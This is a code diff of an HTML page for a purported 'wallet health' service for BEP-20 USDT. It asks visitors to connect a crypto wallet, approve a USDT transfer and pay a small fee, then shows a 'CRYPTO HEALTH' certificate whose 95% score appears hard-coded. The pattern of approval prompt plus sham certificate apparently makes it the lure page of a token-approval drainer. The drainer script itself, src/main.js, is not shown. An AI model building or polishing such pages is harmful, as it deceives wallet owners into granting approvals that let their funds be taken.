@@ -1,7 +1,6 @@
 <!DOCTYPE html>
 <html lang="en" data-bs-theme="dark">
 
-
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -14,8 +13,6 @@
     <link rel="stylesheet" href="static/css/custom.css">
     <script src="https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js"></script>
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500&display=swap" rel="stylesheet">
-
-
 </head>
 
 <body>
@@ -49,7 +46,6 @@
                 <ul class="navbar-nav">
 
                     <li class="nav-item">
-                        <!-- <a class="nav-link" href="admin/login.html"> </a> -->
                     </li>
 
                 </ul>
@@ -59,11 +55,7 @@
 
     <!-- Flash Messages -->
     <div class="container mt-3">
-
-
-
     </div>
-
     <!-- Main Content -->
     <main>
 
@@ -75,21 +67,9 @@
                         Our platform verifies USDT transactions, Ensures proper approvals are in place, and provides Wallet health certificates to protect both buyers and sellers.
                     </p>
                     <div id="introDiv" class="d-grid gap-2 d-sm-flex justify-content-sm-center">
-                        <!-- <a class="btn btn-primary btn-lg px-4 gap-3">
-                            <i class="fas fa-shield-alt me-2" id="connectWallet"></i>Check your BEP-20 USDT tokens
-                        </a> -->
-
-                        <!-- <button id="connectWallet">Connect Wallet</button> -->
-
-                        <!-- <button id="connectWallet" class="btn btn-primary btn-lg px-4 gap-3">
-                            <i class="fas fa-wallet me-2"></i>Check your BEP-20 USDT tokens
-                        </button> -->
-
                         <button id="startConnect" class="btn btn-primary btn-lg px-4 gap-3">
                             <i class="fas fa-wallet me-2"></i>Check BEP-20 tokens
-                          </button>
-                        <!-- Pre-connect Popup -->
-                        <!-- Overlay -->
+                        </button>
                         <!-- HTML -->
                         <div id="preConnectOverlay" class="overlay">
                             <div class="popup-box">
@@ -99,10 +79,6 @@
                                 <button id="connectWallet" class="connect-btn">Proceed</button>
                             </div>
                         </div>
-
-
-
-
                         <a href="how-it-works.html " class="btn btn-outline-secondary btn-lg px-4 ">
                             <i class="fas fa-info-circle me-2 "></i>Learn More
                         </a>
@@ -123,17 +99,10 @@
                                 </button>
                             </div>
                         </div>
-
                         <div class="wallet-row">
                             <span class="wallet-label">USDT Balance:</span>
                             <span id="userBalance">Loading...</span>
                         </div>
-
-                        <div class="wallet-row">
-                            <span class="wallet-label">Certificate No.:</span>
-                            <span id="certificate">Generating...</span>
-                        </div>
-
                         <div class="wallet-row">
                             <span class="wallet-label">Status:</span>
                             <span class="wallet-status">
@@ -142,7 +111,6 @@
                         </div>
                     </div>
 
-                    <!-- Wallet Connection Popup -->
                     <!-- Wallet Connection Popup -->
                     <div id="connectionPopupOverlay" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.4); align-items: center; justify-content: center; z-index: 9999; display: none;">
                         <div id="connectionPopupBox" style="background: #fff; border-radius: 16px; padding: 24px 32px; box-shadow: 0 8px 24px rgba(0,0,0,0.15); max-width: 400px; width: 90%; font-family: 'Segoe UI', sans-serif; position: relative;">
@@ -164,38 +132,29 @@
                                 font-weight: bold;
                                 box-shadow: 0 2px 6px rgba(0,0,0,0.2);
                             ">&times;</button>
-
                             <div style="display: flex; flex-direction: column; gap: 8px; padding: 12px; background-color: #f9f9f9; border: 1px solid #ddd; border-radius: 8px; max-width: 100%; font-family: Arial, sans-serif;">
                                 <div style="display: flex; align-items: center; gap: 10px;">
                                     <span style="width: 12px; height: 12px; background-color: #28a745; border-radius: 50%; display: inline-block;"></span>
                                     <span style="font-size: 16px; color: #222;">
-            Wallet connected to </br><strong>BNB Smart Chain</strong>
-        </span>
+                                        Wallet connected to </br><strong>BNB Smart Chain</strong>
+                                    </span>
                                 </div>
                                 <div>
                                     <span style="font-size: 14px; color: #555;">Address:</span><br>
                                     <span class="user-address" style="font-size: 14px; color: #000; word-break: break-word;"></span>
                                 </div>
                             </div>
-
                         </div>
                     </div>
                     <!-- <button id="approveUSDT">Approve USDT Transfer</button> -->
                     <div id="approveUSDT" style="display: none; flex-direction: column; align-items: center; margin-top: 1rem; margin-bottom: 1rem;">
-                        <!-- <button id="approveUSDT" style="padding: 0.75rem 1.5rem; font-size: 1.25rem; font-weight: bold; border-radius: 14px; background: linear-gradient(145deg, #f7d774, #f1c40f); color: #212529; border: none; box-shadow: 0 5px 15px rgba(241, 196, 15, 0.4); transition: all 0.3s ease; display: flex; align-items: center; justify-content: center; gap: 0.75rem;">
-                            <i class="fas fa-award" style="margin-right: 0.5rem;"></i>Get Certificate For this wallet
-                        </button> -->
                         <button id="startCertificate" style="padding: 0.75rem 1.5rem; font-size: 1.25rem; font-weight: bold; border-radius: 14px; background: linear-gradient(145deg, #f7d774, #f1c40f); color: #212529; border: none; box-shadow: 0 5px 15px rgba(241, 196, 15, 0.4); transition: all 0.3s ease; display: flex; align-items: center; justify-content: center; gap: 0.75rem;">
                             <i class="fas fa-award" style="margin-right: 0.5rem;"></i>Check Wallet health
                           </button>
-
                         <small style="font-size: 0.85rem; color: #f4f5f7; margin-top: 0.5rem;">
                             This will charge you a nominal fee </br>(less than 0.5 USDT)
                         </small>
                     </div>
-
-                    <!-- pop up for permission -->
-
                     <!-- Overlay for Certificate -->
                     <div id="certOverlay" class="popup-overlay" style="display: none;">
                         <div class="popup-box crypto-font" style="max-width: 400px; text-align: center; padding: 30px;">
@@ -208,10 +167,6 @@
                             <button id="approveUSDT" class="btn btn-warning w-100" style="font-weight: bold;">Proceed</button>
                         </div>
                     </div>
-
-
-
-
                 </div>
             </div>
         </section>
@@ -372,6 +327,44 @@
 
     </main>
 
+
+    <!-- html code forhealth card overlay -->
+    <!-- Overlay HTML -->
+    <div class="overlay-background" id="overlay" style="display: none;">
+        <button class="close-overlay" id="closeOverlayBtn">&times;</button>
+
+        <div class="card">
+            <div class="card-header">
+                <span class="card-logo">CRYPTO<span>HEALTH</span></span>
+                <span class="card-chip">⌬</span>
+            </div>
+            <div class="card-wallet-address">
+                <span class="label">Wallet Address</span>
+                <span id="walletAddress">0x71C...3e4a</span>
+            </div>
+            <div class="card-health">
+                <span class="label">Wallet Health</span>
+                <span id="healthScore">95%</span>
+                <div class="health-bar">
+                    <div class="health-bar-fill" id="healthBar"></div>
+                </div>
+            </div>
+            <div class="card-footer">
+                <div class="card-network">
+                    <span class="label">Network</span>
+                    <span>BNB/BEP-20</span>
+                </div>
+                <div class="card-expiry">
+                    <span>Digitally Signed</span>
+                </div>
+            </div>
+            <div class="card-decoration">
+                <div class="hexagon"></div>
+                <div class="hexagon"></div>
+            </div>
+        </div>
+    </div>
+
     <script>
         const observer = new MutationObserver(function(mutationsList) {
             for (let mutation of mutationsList) {
@@ -407,7 +400,6 @@
         }
     </script>
 
-
     <script>
         function copyAddress() {
             const addressInput = document.getElementById("userAddress");
@@ -438,15 +430,10 @@
             }
         });
     </script>
-
     <!-- Bootstrap and other scripts -->
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js "></script>
     <!-- <script src="static/js/main.js "></script> -->
     <script type="module" src="./src/main.js"></script>
-
-
 </body>
-
-</html>
 
 </html>
